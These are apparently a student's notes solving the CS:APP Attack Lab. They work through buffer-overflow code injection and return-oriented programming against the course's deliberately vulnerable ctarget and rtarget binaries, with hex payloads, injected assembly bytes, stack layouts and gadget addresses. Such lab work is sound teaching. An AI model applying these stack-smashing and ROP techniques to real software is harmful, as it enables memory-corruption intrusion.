[toc]
<img src="note_img/attack_phase.png" style="zoom:60%">

```shell
Usage: [-hq] ./ctarget -i <infile> 
  -h          Print help information
  -q          Don't submit result to server
  -i <infile> Input file
```
```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);//Gets terminate by '/n' or EOF
    return 1;
}
```
# Phase 1

> code injection

overview of the stack

```
+---------------------------------------------------+
| return address of getbuf(which you can overwrite) |
+---------------------------------------------------+
|                    0x28(40) buf                   |
+---------------------------------------------------+
|          return address of Puts(syscall)          |
+---------------------------------------------------+
```

## Level 1

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```
Task:get _ctarget_ execute the code for _touch1_ when _getbuf_ execute its return statement.
```assembly
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
```
The starting address of _touch1_
```assembly
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
```
Problems encountered and solutions:
You cannot directly write "00000000004017c0" after 40 char as it's not an address but a seris of ascii code such as '0' is 48!!!

> 48 may still not be right. Because 48 is 0 if and only if we treat the address of it as a char.

It's not easy to address this problem as the range of ascii is 0 ~ 127.
So if you want to input 48(0x30) into the stdin,you can directly type '0'(a char).However,if you want to input 192(0xc0),there is no corresponding letter.

> In fact 192 has corresponding letter, you can use Mac's calculator to search.But not all letters can easily found on keyboard.

We can use _Hex2raw_ to convert.
_Hex2raw_ 可以将一个byte(用16进制表示)转化成能直接输入内存的形式。
比如讲 30 转换成 '0'.

So the solution of level1 is
`./hex2raw < level1.txt > level1_raw.txt`
`./ctarget -qi level1_raw.txt`

```
/* level1.txt */ 
33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33
C0 17 40
```
The dest address is 0x4017c0 and the original address is 0x4019a4 so I begin to wonder if I can only type c0 17 at the end of file. It fails because __Gets add an '\0' at the end of input string__. So the ($rsp+0x28) would become 0x0017c0.
## Level 2
```c
void touch2(unsigned val)
{
  vlevel = 2; /* Part of validation protocol */
  if (val == cookie) {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  } 
  else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```
ret 从栈中弹出一个地址，并跳转到这个地址。
查阅知进入getbuf后，`%rsp-0x28`后的地址为`0x5561dc78`
我的cookie是：`0x59b997fa`
exploit code:
```assembly
movq $0x59b997fa,%rdi
ret
```
```
0: 48 c7 c7 fa 97 b9 59   movq $0x59b997fa,%rdi
7: c3                 retq
```
栈结构：

- exploit code
- address of touch2
- %rsp => -address of exploit code (`0x5561dc78 + 0x28 + 0x8 + 0x8 = 0x5561dcb0`)

touch2
`0x00000000004017ec <+0>:	sub    $0x8,%rsp`

problems encountered and solutions:
movq只能传送32位补码数字的立即数作为源操作数。然后将这个值符号拓展到64位。
而我的cookie是0x59b997fa，显然
```
0: bf fa 97 b9 59   movl $0x59b997fa,%edi
5: c3            retq
```
```
0: bf fa 97 b9 59  movl $0x59b997fa,%edi$
5: 48 83 ec 18   sub $0x18,%rsp
9: c3   retq
```
以上对level2的尝试均告失败:sob::sob:，报错均为`segmatation fault`。
因为我将攻击代码写到了该函数可用空间的外面。应该将代码写到`%rsp ~ %rsp-0x28`的范围内。

正确栈结构：

- address of touch2(0x4017ec)
- %rsp=> exploit code address(0x5561dc78)
- ...some char...
- 0x5561dc78:bf fa 97 b9 59 c3

> 也可以使用这样的攻击代码
> ```assembly
> movl $cookie,%rdi
> pushq $0x4017ec
> ret
> ```
> 这样就不用自己再栈中写入touch2的开始地址了。

## level 3

> from here we use the code from SE101 lab

```c
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4   char cbuf[110];
5   /* Make position of check string unpredictable */
6   char *s = cbuf + random() % 100;
7   sprintf(s, "%.8x", val);
8   return strncmp(sval, s, 9) == 0;
9 }
10
11 void touch3(char *sval)
12 {
13   vlevel = 3; /* Part of validation protocol */
14   if (hexmatch(cookie, sval)) {
15 	   printf("Touch3!: You called touch3(\"%s\")\n", sval);
16 	   validate(3);
17   } else {
18 	   printf("Misfire: You called touch3(\"%s\")\n", sval);
19 	   fail(3);
20   }
21 	 exit(0);
22 }
```

Since hexmatch will overwrite the buffer, we have to store the string into a safe place which can be above address of  

```
+---------------------------------------------+
|              address of string              |
+---------------------------------------------+
|  start address of injected code(0x5566b658) |
+---------------------------------------------+  0x5566b680
| 0x28(40) buf(will be overwrite by hexmatch) |
|       but we can inject our code here       |
+---------------------------------------------+  0x5566b658
|       return address of Puts(syscall)       |
+---------------------------------------------+
```

injected code is

```assembly
movq $address_of_string,%rdi # 0x5566b680 + 0x8 = 0x5566b688
pushq $address_of_touch3 # 0x401c73
retq
```

ascii code of my cookie(0x2a328fb5)

```
0x32 0x61 0x33 0x32 0x38 0x66 0x62 0x35
```

# Phase 2

rtarget use two methods to prevent attack.

1. **randomize the stack** which makes it impossible to determine where your injected code will be located

   > but the address of .data won't change

2. **marks the section of memory holding the stack as nonexecutable** so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.

The strategy with ROP is to identify byte sequences within an existing program 

## Level 4

instructions found:

- movq %rax,%rdi at getval_440
- pop %rbx at addval_106
- pop %rbp at ... full of

Only find one move which move %rax to %rdi, thus we need to find a pop %rax if we only need two gadgets.

Then we find `58 90 90 c3` at getval_462 which isn't so obvious if we don't recoginize 90 is `nop`.

`getval_440`: 0x401d07

`getval_462`: 0x401d36

Then we can construct our stack

```
+---------------------------+
|     address of touch2     |
+---------------------------+
| address of movq %rax,%rdi | 0x401d07 + 1 = 0x401d08
+---------------------------+
|           cookie          |
+---------------------------+
|    address of pop %rax    | 0x401d36 + 1 = 0x401d37
+---------------------------+
|            buf            |
+---------------------------+
```

## level 5

general:

1. popq offset->%rsi(or %rdi)
2. %rsp -> %rdi(or %rsi)
3. add_xy -> %rax
4. %rax -> %rdi
5. touch3

### step by step solution

no pop %rsi

only find `mov %rcx,%rsi`  `89 ce`

no pop %rcx

find `mov %rdx,%rcx` `89 d1`

no pop %rdx

find `mov %rax,%rdx`  `89 c2`

pop %rax

finish step1

---

not %rsp -> %rdi

only find %rsp -> %rax `89 e0`

find %rax->%rdi `89 c7`

finish step 2

---

call add_xy

---

already find %rax->%rdi `89 c7`

finish step 4

---

call touch 3

---

The stack

```
+-------------------+
|      cookie       |
+-------------------+
| address of touch3 | 0x401c73
+-------------------+
|     getval_440    | 0x401d07 + 1 = 0x401d08
+-------------------+
| address of add_xy | 0x401d42
+-------------------+
|     getval_440    | 0x401d07 + 1 = 0x401d08
+-------------------+ <--%rsp
|     getval_288    | 0x401d9e + 1 0x401d9f `mov %rsp,%rax`
+-------------------+
|     addval_122    | 0x401d61 + 3 = 0x401d64
+-------------------+
|     setval_183    | 0x401df3 + 3 = 0x401df6
+-------------------+
|     setval_153    | 0x401dd8 + 2 = 0x401dda
+-------------------+
|       offset      | 32 = 0x20
+-------------------+
|     addval_370    | 0x401d29 + 2 = 0x401d2b
+-------------------+
|       buffer      |
+-------------------+
```

Debug log:

1. %rsp is very big(more than 4 bytes) which means you should use movq instead of movl to transfer them.
2. Don't forget to add `0` to the address's upper part.